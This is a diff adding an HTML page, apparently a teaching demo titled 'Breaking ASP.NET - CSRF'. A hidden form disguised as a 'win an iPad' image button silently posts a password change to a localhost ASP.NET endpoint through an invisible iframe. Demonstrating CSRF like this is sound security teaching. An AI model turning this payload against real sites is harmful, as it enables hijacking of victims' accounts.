@@ -1,0 +1,16 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Breaking ASP.NET - CSRF</title>
+	<meta charset="utf-8" />
+</head>
+<body>
+<form action="https://localhost:44354/Manage2/ChangePassword" method="POST" target="csrfFrame">
+    <input type="hidden" name="OldPassword" value="password1"/>
+    <input type="hidden" name="NewPassword" value="h4ck3d" />
+    <input type="hidden" name="ConfirmPassword" value="h4ck3d" />
+    <input type="image" src="win-ipad.jpg" />
+</form>
+    <iframe name="csrfFrame" style="display: none;"></iframe>
+</body>
+</html>
